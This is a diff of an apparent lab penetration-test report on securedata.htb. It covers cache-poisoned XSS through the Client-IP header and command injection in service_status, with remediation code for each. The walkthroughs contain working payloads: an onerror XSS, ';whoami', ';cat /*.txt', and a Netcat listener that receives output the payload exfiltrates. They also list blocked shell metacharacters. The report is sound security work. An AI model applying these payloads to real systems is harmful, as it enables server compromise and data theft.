+      resources. In this case, the attacker leveraged the victim’s session to reach /fetch_logs, /fetch_sysinfo, and /service_status, ultimately achieving remote code execution through the
+      command-injection flaw in the service parameter.
+
+   4. Administrative compromise
+      Because the target victim is an administrator, successful exploitation grants the attacker the same privileges within the application, leading to full compromise of the web
+      application and potentially the underlying infrastructure.
 
 #### Detailed Walkthrough
 
-Prerequisites                                                                                                                                                                             
-                                                                                                                                                                                             
-   • Valid administrator session cookie obtained from the the race condition we did before.                                                                                                         
-                                                                                                                                                                                             
-   Steps                                                                                                                                                                                     
-                                                                                                                                                                                             
-   1. Authenticate as the administrator.                                                                                                                                                     
-      Set the stolen administrator session cookie in the browser and navigate to the application to confirm successful login.                                                                
-                                                                                                                                                                                             
-   2. Navigate to the affected endpoint.                                                                                                                                                     
-      In the browser, request https://securedata.htb/admin/admin_panel.php.                                                                                                                        
-                                                                                                                                                                                             
-   3. Intercept the request.                                                                                                                                                                 
-      In the intercepting proxy, capture the outgoing GET request to /admin/admin_panel.php.                                                                                                        
-                                                                                                                                                                                             
-   4. Inject a benign XSS payload into the Client-IP header.                                                                                                                                 
-      Add the following header to the request before forwarding it to the server:                                                                                                            
-      ```                                                                                                                                                                                    
-        CLIENT-IP: <img src=0 onerror=alert(1)>                                                                                                                                              
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-  
+Prerequisites
+
+   • Valid administrator session cookie obtained from the the race condition we did before.
+
+   Steps
+
+   1. Authenticate as the administrator.
+      Set the stolen administrator session cookie in the browser and navigate to the application to confirm successful login.
+
+   2. Navigating to the affected endpoint loaded the cached response.
+      In the browser, request https://securedata.htb/admin/admin_panel.php.
+
+   3. Intercept the request.
+      In the intercepting proxy, capture the outgoing GET request to /admin/admin_panel.php.
+
+   4. Inject a benign XSS payload into the Client-IP header.
+      Add the following header to the request before forwarding it to the server:
+      ```
+        CLIENT-IP: <img src=0 onerror=alert(1)>
+      ```
+
+
+
    
-   ![](assets/edited-RYrm5y4t.png){width="auto"}
-   
-   5. Forward the request.                                                                                                                                                                   
-      Allow the modified request to reach the server and return the response to the browser.                                                                                                 
-                                                                                                                                                                                             
-   6. Observe the reflected payload.                                                                                                                                                         
-      The browser renders the response and executes the injected script, triggering the alert dialog with the value 1. This confirms that the Client-IP header value is reflected unsanitized into the response body.                                                                                                                                                                
-                                                                                                                                                                                             
-   7. Verify cache persistence.                                                                                                                                                              
-      Disable interception in the proxy and reload /admin/admin_panel.php in the browser using a normal request (without the custom Client-IP header or any proxy modification).                    
-                                                                                                                                                                                             
-   8. Confirm the payload is still served.                                                                                                                                                   
+
+![RYrm5y4t](assets/edited-RYrm5y4t.png)
+
+   5. Forward the request.
+      Allow the modified request to reach the server and return the response to the browser.
+
+   6. Observe the reflected payload.
+      The browser renders the response and executes the injected script, triggering the alert dialog with the value 1. This confirms that the Client-IP header value is reflected unsanitized into the response body.
+
+   7. Verify cache persistence.
+      Disable interception in the proxy and reload /admin/admin_panel.php in the browser using a normal request (without the custom Client-IP header or any proxy modification).
+
+   8. Confirm the payload is still served.
       The alert dialog appears again, demonstrating that the malicious response was cached by the upstream cache and is still being served to subsequent requests. The XSS condition persists
-      until the cached entry expires (approximately five minutes) or is otherwise invalidated.                                                                                               
-                                   ![](assets/edited-i2SG4GhN.png){width="auto"}                                                                                                                                                          
+      until the cached entry expires (approximately five minutes) or is otherwise invalidated.
+                                   
+
+![i2SG4GhN](assets/edited-i2SG4GhN.png)
 
 
 #### Patching and Remediation
 
-   1. Stop reflecting the Client-IP header                                                                                                                                                   
-                                                                                                                                                                                             
+   1. Stop reflecting the Client-IP header
+
    The safest fix is to remove the code that writes the Client-IP header into the response. If the application does not need to display the client IP address in the page, there should be no
-   reflection logic at all.                                                                                                                                                                  
-                                                                                                                                                                                             
-   Before (vulnerable):                                                                                                                                                                      
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <!-- admin_panel.php -->                                                                                                                                                                
-     <p>Your IP: <?php echo $_SERVER['HTTP_CLIENT_IP']; ?></p>                                                                                                                               
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   After (fixed):                                                                                                                                                                            
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <!-- admin_panel.php -->                                                                                                                                                                
-     <!-- Remove the Client-IP reflection entirely -->                                                                                                                                       
-     <p>Your IP: [removed]</p>                                                                                                                                                               
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   2. If reflection is required, validate and encode                                                                                                                                         
-                                                                                                                                                                                             
-   If the IP address must be displayed, validate that it is a well-formed IP and HTML-encode it before output.                                                                               
-                                                                                                                                                                                             
-   PHP fix:                                                                                                                                                                                  
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     $client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? '';                                                                                                                                          
-                                                                                                                                                                                             
-     if (filter_var($client_ip, FILTER_VALIDATE_IP)) {                                                                                                                                       
-         echo htmlspecialchars($client_ip, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');                                                                                                            
-     } else {                                                                                                                                                                                
-         echo 'Unknown';                                                                                                                                                                     
-     }                                                                                                                                                                                       
-     ?>                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This prevents HTML/JS injection because characters like <, >, ", ', and & are converted to HTML entities.                                                                                 
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   3. Fix the cache keying                                                                                                                                                                   
-                                                                                                                                                                                             
-   Do not include the Client-IP header in the cache key. Caches should key responses only on safe, non-attacker-controlled values such as the URL, host, and accepted content type.          
-                                                                                                                                                                                             
-   nginx example — remove header from cache key:                                                                                                                                             
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     proxy_cache_key "$scheme$request_method$host$request_uri";                                                                                                                              
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Do not use:                                                                                                                                                                               
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     # Vulnerable                                                                                                                                                                            
-     proxy_cache_key "$scheme$request_method$host$request_uri$http_client_ip";                                                                                                               
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Varnish example:                                                                                                                                                                          
-                                                                                                                                                                                             
-   ```vcl                                                                                                                                                                                    
-     sub vcl_hash {                                                                                                                                                                          
-         hash_data(req.url);                                                                                                                                                                 
-         if (req.http.host) {                                                                                                                                                                
-             hash_data(req.http.host);                                                                                                                                                       
-         } else {                                                                                                                                                                            
-             hash_data(server.ip);                                                                                                                                                           
-         }                                                                                                                                                                                   
-         # Do NOT add req.http.Client-IP or req.http.X-Forwarded-For here                                                                                                                    
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   4. Mark dynamic pages as non-cacheable                                                                                                                                                    
-                                                                                                                                                                                             
-   If the response contains user-controlled or session-sensitive data, instruct the cache not to store it.                                                                                   
-                                                                                                                                                                                             
-   PHP / HTTP headers:                                                                                                                                                                       
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');                                                                                                                
-     header('Pragma: no-cache');                                                                                                                                                             
-     header('Expires: 0');                                                                                                                                                                   
-     ?>                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   5. Harden cookies                                                                                                                                                                         
-                                                                                                                                                                                             
-   Because the XSS can steal session cookies, configure cookies to resist exfiltration and misuse.                                                                                           
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     session_set_cookie_params([                                                                                                                                                             
-         'lifetime' => 3600,                                                                                                                                                                 
-         'path' => '/',                                                                                                                                                                      
-         'domain' => 'securedata.htb',                                                                                                                                                       
-         'secure' => true,                                                                                                                                                                   
-         'httponly' => true,                                                                                                                                                                 
-         'samesite' => 'Strict'                                                                                                                                                              
-     ]);                                                                                                                                                                                     
-     session_start();                                                                                                                                                                        
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   • HttpOnly: Prevents JavaScript from reading the session cookie.                                                                                                                          
-   • Secure: Sends the cookie only over HTTPS.                                                                                                                                               
-   • SameSite=Strict: Prevents cross-origin cookie submission.                                                                                                                               
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   6. Add Content Security Policy (CSP)                                                                                                                                                      
-                                                                                                                                                                                             
-   A strict CSP blocks inline scripts and unauthorized outbound requests, reducing the impact of any future XSS.                                                                             
-                                                                                                                                                                                             
-   Example header:                                                                                                                                                                           
-                                                                                                                                                                                             
-   ```http                                                                                                                                                                                   
-     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; connect-src 'self'; img-src 'self'; base-uri 'self'; form-action 'self';                             
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   For legacy compatibility, report-only mode can be used during testing:                                                                                                                    
-                                                                                                                                                                                             
-   ```http                                                                                                                                                                                   
-     Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;                                                                                                        
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   7. Additional headers                                                                                                                                                                     
-                                                                                                                                                                                             
-   ```http                                                                                                                                                                                   
-     X-Content-Type-Options: nosniff                                                                                                                                                         
-     X-Frame-Options: DENY                                                                                                                                                                   
-     Referrer-Policy: strict-origin-when-cross-origin 
+   reflection logic at all.
+
+   Before (vulnerable):
+
+   ```php
+     <!-- admin_panel.php -->
+     <p>Your IP: <?php echo $_SERVER['HTTP_CLIENT_IP']; ?></p>
+   ```
+
+   After (fixed):
+
+   ```php
+     <!-- admin_panel.php -->
+     <!-- Remove the Client-IP reflection entirely -->
+     <p>Your IP: [removed]</p>
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   2. If reflection is required, validate and encode
+
+   If the IP address must be displayed, validate that it is a well-formed IP and HTML-encode it before output.
+
+   PHP fix:
+
+   ```php
+     <?php
+     $client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? '';
+
+     if (filter_var($client_ip, FILTER_VALIDATE_IP)) {
+         echo htmlspecialchars($client_ip, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+     } else {
+         echo 'Unknown';
+     }
+     ?>
+   ```
+
+   This prevents HTML/JS injection because characters like <, >, ", ', and & are converted to HTML entities.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   3. Fix the cache keying
+
+   Do not include the Client-IP header in the cache key. Caches should key responses only on safe, non-attacker-controlled values such as the URL, host, and accepted content type.
+
+   nginx example — remove header from cache key:
+
+   ```nginx
+     proxy_cache_key "$scheme$request_method$host$request_uri";
+   ```
+
+   Do not use:
+
+   ```nginx
+     # Vulnerable
+     proxy_cache_key "$scheme$request_method$host$request_uri$http_client_ip";
+   ```
+
+   Varnish example:
+
+   ```vcl
+     sub vcl_hash {
+         hash_data(req.url);
+         if (req.http.host) {
+             hash_data(req.http.host);
+         } else {
+             hash_data(server.ip);
+         }
+         # Do NOT add req.http.Client-IP or req.http.X-Forwarded-For here
+     }
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   4. Mark dynamic pages as non-cacheable
+
+   If the response contains user-controlled or session-sensitive data, instruct the cache not to store it.
+
+   PHP / HTTP headers:
+
+   ```php
+     <?php
+     header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+     header('Pragma: no-cache');
+     header('Expires: 0');
+     ?>
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   5. Harden cookies
+
+   Because the XSS can steal session cookies, configure cookies to resist exfiltration and misuse.
+
+   ```php
+     session_set_cookie_params([
+         'lifetime' => 3600,
+         'path' => '/',
+         'domain' => 'securedata.htb',
+         'secure' => true,
+         'httponly' => true,
+         'samesite' => 'Strict'
+     ]);
+     session_start();
+   ```
+
+   • HttpOnly: Prevents JavaScript from reading the session cookie.
+   • Secure: Sends the cookie only over HTTPS.
+   • SameSite=Strict: Prevents cross-origin cookie submission.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   6. Add Content Security Policy (CSP)
+
+   A strict CSP blocks inline scripts and unauthorized outbound requests, reducing the impact of any future XSS.
+
+   Example header:
+
+   ```http
+     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; connect-src 'self'; img-src 'self'; base-uri 'self'; form-action 'self';
+   ```
+
+   For legacy compatibility, report-only mode can be used during testing:
+
+   ```http
+     Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   7. Additional headers
+
+   ```http
+     X-Content-Type-Options: nosniff
+     X-Frame-Options: DENY
+     Referrer-Policy: strict-origin-when-cross-origin
 
 
 ### Remote Code Execution in http://api.securedata.htb/service_status?service=nginx {#d80d28b1-7608-40ff-a635-4a64c7c47b08}
@@ -5748,73 +5732,71 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (7.5 - High)
 
 #### Description & Cause
 
-   The service_status endpoint on api.securedata.htb accepts a service parameter that is passed directly to a shell command without proper validation or escaping. Because the input is      
-   concatenated into a command executed by the operating system, an attacker can inject shell metacharacters such as ;, |, &&, and $() to append and execute arbitrary commands.             
-                                                                                                                                                                                             
+   The service_status endpoint on api.securedata.htb accepts a service parameter that is passed directly to a shell command without proper validation or escaping. Because the input is
+   concatenated into a command executed by the operating system, an attacker can inject shell metacharacters such as ;, |, &&, and $() to append and execute arbitrary commands.
+
    In the observed attack chain, an attacker first poisoned the application cache with an XSS payload via the Client-IP header. When an authenticated administrator loaded the affected page,
-   the malicious JavaScript executed in the administrator’s browser and sent requests to:                                                                                                    
-                                                                                                                                                                                             
-   ```                                                                                                                                                                                       
-     http://api.securedata.htb/service_status?service=nginx;whoami                                                                                                                           
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   The server executed whoami along with the intended service command and returned the command output in the HTTP response. The XSS payload then captured that response and sent it to the   
-   attacker’s listener, confirming successful remote code execution on the internal API host.                                                                                                
-                                                                                                                                                                                             
-   This flaw allows an attacker who can coerce an authenticated user into making requests — or who can directly reach the endpoint — to run arbitrary system commands, read sensitive files, 
-   and fully compromise the server.                                                                                                                                                          
-                                                                                                                                                                                             
-   Causes                                                                                                                                                                                    
-                                                                                                                                                                                             
-   1. Unsafe command construction                                                                                                                                                            
+   the malicious JavaScript executed in the administrator’s browser and sent requests to:
+
+   ```
+     http://api.securedata.htb/service_status?service=nginx;whoami
+   ```
+
+   The server executed whoami along with the intended service command and returned the command output in the HTTP response. The XSS payload then captured that response and sent it to the
+   attacker’s listener, confirming successful remote code execution on the internal API host.
+
+   This flaw allows an attacker who can coerce an authenticated user into making requests — or who can directly reach the endpoint — to run arbitrary system commands, read sensitive files,
+   and fully compromise the server.
+
+   Causes
+
+   1. Unsafe command construction
       The application builds a shell command using the service parameter as a literal argument without parameterization. For example, a call such as system("service " + $_GET['service'] + "
-      status") allows an attacker to break out of the intended command and execute arbitrary instructions.                                                                                   
-                                                                                                                                                                                             
-   2. Missing input validation                                                                                                                                                               
-      The service parameter is not validated against a strict whitelist of allowed service names. The application accepts any string, including values containing shell control characters.  
-                                                                                                                                                                                             
-   3. No output escaping or dangerous-character filtering                                                                                                                                    
-      Metacharacters such as ;, |, &, $, `, and () are not removed or escaped before the string is passed to the shell.                                                                      
-                                                                                                                                                                                             
-   4. Internal endpoint lacks additional authorization                                                                                                                                       
-      The service_status endpoint is reachable from the context of an authenticated administrator and can be invoked through the admin’s browser via XSS, giving an attacker a trusted       
-      internal path to the command-injection flaw.                                                                                                                                           
-                                                                                                                                                                                             
-   5. Application runs with unnecessary privileges                                                                                                                                           
+      status") allows an attacker to break out of the intended command and execute arbitrary instructions.
+
+   2. Missing input validation
+      The service parameter is not validated against a strict whitelist of allowed service names. The application accepts any string, including values containing shell control characters.
+
+   3. No output escaping or dangerous-character filtering
+      Metacharacters such as ;, |, &, $, `, and () are not removed or escaped before the string is passed to the shell.
+
+   4. Internal endpoint lacks additional authorization
+      The service_status endpoint is reachable from the context of an authenticated administrator and can be invoked through the admin’s browser via XSS, giving an attacker a trusted
+      internal path to the command-injection flaw.
+
+   5. Application runs with unnecessary privileges
       The web application process executes shell commands with privileges sufficient to run system service scripts and read arbitrary files, increasing the impact of the command injection.
 
 #### Security Impact
 
-   1. Remote code execution                                                                                                                                                                  
-      An attacker can execute arbitrary operating-system commands on the server hosting api.securedata.htb. This includes reading files, modifying configuration, installing persistence     
-      mechanisms, and launching further attacks.                                                                                                                                             
-                                                                                                                                                                                             
-   2. Sensitive data exposure                                                                                                                                                                
-      The attacker can read any file accessible to the web process. In this case, the flag file located in the web root (/*.txt) was retrieved, demonstrating direct access to sensitive     
-      application data.                                                                                                                                                                      
-                                                                                                                                                                                             
-   3. Full server compromise                                                                                                                                                                 
-      With arbitrary command execution, the attacker can enumerate the system, extract credentials, access internal networks, and potentially escalate privileges to root or other service   
-      accounts.                                                                                                                                                                              
-                                                                                                                                                                                             
-   4. Lateral movement                                                                                                                                                                       
-      The compromised API server can be used as a pivot to attack other internal hosts, services, and databases that are reachable from the server but not from the external network.        
-                                                                                                                                                                                             
-   5. Service disruption                                                                                                                                                                     
-      The attacker can stop, start, or misconfigure services, delete files, exhaust resources, or otherwise degrade the availability of the application and underlying host.                 
-                                                                                                                                                                                             
-   6. Loss of integrity and confidentiality                                                                                                                                                  
-      All data and functionality on the server are effectively under attacker control, leading to a complete loss of confidentiality and integrity for the affected system.                  
- 
+   1. Remote code execution
+      An attacker can execute arbitrary operating-system commands on the server hosting api.securedata.htb. This includes reading files, modifying configuration, installing persistence
+      mechanisms, and launching further attacks.
+
+   2. Sensitive data exposure
+      The attacker can read any file accessible to the web process. In this case, the flag file located in the web root (/*.txt) was retrieved, demonstrating direct access to sensitive
+      application data.
+
+   3. Full server compromise
+      With arbitrary command execution, the attacker can enumerate the system, extract credentials, access internal networks, and potentially escalate privileges to root or other service
+      accounts.
+
+   4. Lateral movement
+      The compromised API server can be used as a pivot to attack other internal hosts, services, and databases that are reachable from the server but not from the external network.
+
+   5. Service disruption
+      The attacker can stop, start, or misconfigure services, delete files, exhaust resources, or otherwise degrade the availability of the application and underlying host.
+
+   6. Loss of integrity and confidentiality
+      All data and functionality on the server are effectively under attacker control, leading to a complete loss of confidentiality and integrity for the affected system.
+
 
 
 #### Detailed Walkthrough
 
 #### 1. Start the attacker listener
 
-On the attacker machine, start a Netcat listener on the port referenced in the XSS payload (in this example, `4444`):
-
-bash
+On the attacker system, a Netcat listener was started on the port referenced in the XSS payload (in this example, `4444`):
 
 ```bash
 nc -lvnp 4444
@@ -5847,7 +5829,7 @@ GET http://api.securedata.htb/service_status?service=nginx;ls /
 
 The semicolon terminates the intended `service` argument and appends `whoami`, which is executed by the server.
 
-![](assets/edited-MLMEo4pw.png){width="auto"}
+![MLMEo4pw](assets/edited-MLMEo4pw.png)
 
 #### 5. Response is exfiltrated to the listener
 
@@ -5866,7 +5848,7 @@ GET http://api.securedata.htb/service_status?service=nginx;cat /*.txt
 
 ```
 
-![](assets/edited-yM37U7I6.png){width="auto"}
+![yM37U7I6](assets/edited-yM37U7I6.png)
 
 #### 7. Flag / sensitive file captured
 
@@ -5879,130 +5861,130 @@ The server returns the contents of `.txt`  files in the root directory, includin
 
 #### Patching and Remediation
 
- 1. Avoid shell execution with user input                                                                                                                                                  
-                                                                                                                                                                                             
-   The most effective fix is to not pass the service parameter to a shell command at all. Use a language-native or safe API to query service status.                                         
-                                                                                                                                                                                             
-   PHP example using a whitelist instead of shell injection:                                                                                                                                 
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     $allowed_services = ['nginx', 'apache2', 'mysql'];                                                                                                                                      
-                                                                                                                                                                                             
-     $service = $_GET['service'] ?? '';                                                                                                                                                      
-                                                                                                                                                                                             
-     if (!in_array($service, $allowed_services, true)) {                                                                                                                                     
-         http_response_code(400);                                                                                                                                                            
-         echo json_encode(['error' => 'Invalid service name']);                                                                                                                              
-         exit;                                                                                                                                                                               
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     // Use escapeshellarg as a defense-in-depth measure                                                                                                                                     
-     $safe_service = escapeshellarg($service);                                                                                                                                               
-     $output = shell_exec("systemctl status {$safe_service} 2>&1");                                                                                                                          
-                                                                                                                                                                                             
-     echo json_encode(['status' => $output]);                                                                                                                                                
-     ?>                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Better yet, avoid shell_exec entirely:                                                                                                                                                    
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     $allowed_services = ['nginx', 'apache2', 'mysql'];                                                                                                                                      
-     $service = $_GET['service'] ?? '';                                                                                                                                                      
-                                                                                                                                                                                             
-     if (!in_array($service, $allowed_services, true)) {                                                                                                                                     
-         http_response_code(400);                                                                                                                                                            
-         echo json_encode(['error' => 'Invalid service name']);                                                                                                                              
-         exit;                                                                                                                                                                               
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     // PHP-native approach where available                                                                                                                                                  
-     $status = service_status($service); // hypothetical safe wrapper                                                                                                                        
-     echo json_encode(['status' => $status]);                                                                                                                                                
-     ?>                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   2. Strict input validation                                                                                                                                                                
-                                                                                                                                                                                             
-   • Accept only a predefined list of valid service names.                                                                                                                                   
-   • Reject any input containing shell metacharacters such as ;, |, &, `, $, (), <, >, \, and newlines.                                                                                      
-   • Validate length and expected format.                                                                                                                                                    
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   3. Defense-in-depth: escape if shell is unavoidable                                                                                                                                       
-                                                                                                                                                                                             
-   If shell execution is absolutely required, use the language-provided escaping function:                                                                                                   
-                                                                                                                                                                                             
-   ┌──────────┬────────────────────────────────────────────────────────┐                                                                                                                     
-   │ Language │ Function                                               │                                                                                                                     
-   ├──────────┼────────────────────────────────────────────────────────┤                                                                                                                     
-   │ PHP      │ escapeshellarg()                                       │                                                                                                                     
-   ├──────────┼────────────────────────────────────────────────────────┤                                                                                                                     
-   │ Python   │ shlex.quote()                                          │                                                                                                                     
-   ├──────────┼────────────────────────────────────────────────────────┤                                                                                                                     
-   │ Node.js  │ No built-in; use child_process.spawn() with array args │                                                                                                                     
-   ├──────────┼────────────────────────────────────────────────────────┤                                                                                                                     
-   │ Java     │ ProcessBuilder with argument list                      │                                                                                                                     
-   └──────────┴────────────────────────────────────────────────────────┘                                                                                                                     
-                                                                                                                                                                                             
-   Never concatenate user input directly into a command string.                                                                                                                              
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   4. Run with least privilege                                                                                                                                                               
-                                                                                                                                                                                             
+ 1. Avoid shell execution with user input
+
+   The most effective fix is to not pass the service parameter to a shell command at all. Use a language-native or safe API to query service status.
+
+   PHP example using a whitelist instead of shell injection:
+
+   ```php
+     <?php
+     $allowed_services = ['nginx', 'apache2', 'mysql'];
+
+     $service = $_GET['service'] ?? '';
+
+     if (!in_array($service, $allowed_services, true)) {
+         http_response_code(400);
+         echo json_encode(['error' => 'Invalid service name']);
+         exit;
+     }
+
+     // Use escapeshellarg as a defense-in-depth measure
+     $safe_service = escapeshellarg($service);
+     $output = shell_exec("systemctl status {$safe_service} 2>&1");
+
+     echo json_encode(['status' => $output]);
+     ?>
+   ```
+
+   Better yet, avoid shell_exec entirely:
+
+   ```php
+     <?php
+     $allowed_services = ['nginx', 'apache2', 'mysql'];
+     $service = $_GET['service'] ?? '';
+
+     if (!in_array($service, $allowed_services, true)) {
+         http_response_code(400);
+         echo json_encode(['error' => 'Invalid service name']);
+         exit;
+     }
+
+     // PHP-native approach where available
+     $status = service_status($service); // hypothetical safe wrapper
+     echo json_encode(['status' => $status]);
+     ?>
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   2. Strict input validation
+
+   • Accept only a predefined list of valid service names.
+   • Reject any input containing shell metacharacters such as ;, |, &, `, $, (), <, >, \, and newlines.
+   • Validate length and expected format.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   3. Defense-in-depth: escape if shell is unavoidable
+
+   If shell execution is absolutely required, use the language-provided escaping function:
+
+   ┌──────────┬────────────────────────────────────────────────────────┐
+   │ Language │ Function                                               │
+   ├──────────┼────────────────────────────────────────────────────────┤
+   │ PHP      │ escapeshellarg()                                       │
+   ├──────────┼────────────────────────────────────────────────────────┤
+   │ Python   │ shlex.quote()                                          │
+   ├──────────┼────────────────────────────────────────────────────────┤
+   │ Node.js  │ No built-in; use child_process.spawn() with array args │
+   ├──────────┼────────────────────────────────────────────────────────┤
+   │ Java     │ ProcessBuilder with argument list                      │
+   └──────────┴────────────────────────────────────────────────────────┘
+
+   Never concatenate user input directly into a command string.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   4. Run with least privilege
+
    The web application process should not have permission to execute arbitrary system commands or access the full filesystem. Run the API under a dedicated, unprivileged account with access
-   restricted to the minimum required resources.                                                                                                                                             
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   5. Restrict access to internal APIs                                                                                                                                                       
-                                                                                                                                                                                             
-   • Place api.securedata.htb on an internal network not reachable from the public-facing application or user browsers.                                                                      
-   • Require strong authentication and authorization for all internal endpoints.                                                                                                             
-   • Do not rely on browser same-origin policy alone to protect internal services.                                                                                                           
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   6. Disable unnecessary dangerous functions                                                                                                                                                
-                                                                                                                                                                                             
-   If the application does not need to execute shell commands, disable or restrict dangerous functions at the language/runtime level.                                                        
-                                                                                                                                                                                             
-   PHP example (php.ini):                                                                                                                                                                    
-                                                                                                                                                                                             
-   ```ini                                                                                                                                                                                    
-     disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec                                                                                                          
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Only enable the minimum required functions.                                                                                                                                               
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   7. Implement Web Application Firewall (WAF) rules                                                                                                                                         
-                                                                                                                                                                                             
-   Add WAF rules to block common command-injection patterns in the service parameter, such as:                                                                                               
-                                                                                                                                                                                             
-   ```                                                                                                                                                                                       
-     ; | && || ` $ ( ) { } < >                                                                                                                                                               
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This is a secondary control and should not replace secure coding.                                                                                                                         
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   8. Logging and monitoring                                                                                                                                                                 
-                                                                                                                                                                                             
-   Log all requests to /service_status, including the service parameter value and the source IP. Alert on:                                                                                   
-                                                                                                                                                                                             
-   • Requests containing shell metacharacters.                                                                                                                                               
-   • Requests to internal endpoints from unexpected sources.                                                                                                                                 
-   • Unusual process spawning by the web server user.                                                                                                                                        
-                                                        
+   restricted to the minimum required resources.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   5. Restrict access to internal APIs
+
+   • Place api.securedata.htb on an internal network not reachable from the public-facing application or user browsers.
+   • Require strong authentication and authorization for all internal endpoints.
+   • Do not rely on browser same-origin policy alone to protect internal services.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   6. Disable unnecessary dangerous functions
+
+   If the application does not need to execute shell commands, disable or restrict dangerous functions at the language/runtime level.
+
+   PHP example (php.ini):
+
+   ```ini
+     disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec
+   ```
+
+   Only enable the minimum required functions.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   7. Implement Web Application Firewall (WAF) rules
+
+   Add WAF rules to block common command-injection patterns in the service parameter, such as:
+
+   ```
+     ; | && || ` $ ( ) { } < >
+   ```
+
+   This is a secondary control and should not replace secure coding.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   8. Logging and monitoring
+
+   Log all requests to /service_status, including the service parameter value and the source IP. Alert on:
+
+   • Requests containing shell metacharacters.
+   • Requests to internal endpoints from unexpected sources.
+   • Unusual process spawning by the web server user.
+
 
 
 ## Appendix {#appendix}
@@ -6012,7 +5994,7 @@ The server returns the contents of `.txt`  files in the root directory, includin
 Each finding has been assigned a severity rating of critical, high, medium, low or info. The rating is based off of an assessment of the priority with which each finding should be viewed and the potential impact each has on the confidentiality, integrity, and availability of data.
 
 | Rating   | CVSS Score Range |
-| -------- | ---------------- | 
+| -------- | ---------------- |
 | Critical | 9.0 – 10.0       |
 | High     | 7.0 – 8.9        |
 | Medium   | 4.0 – 6.9        |
@@ -6065,14 +6047,14 @@ The methodology included the following phases:
 
 The following flags were captured during the assessment:
 
-| Flag # | Application           | Flag Value | Method Used           |
-| ------ | --------------------- | ---------- | --------------------- |
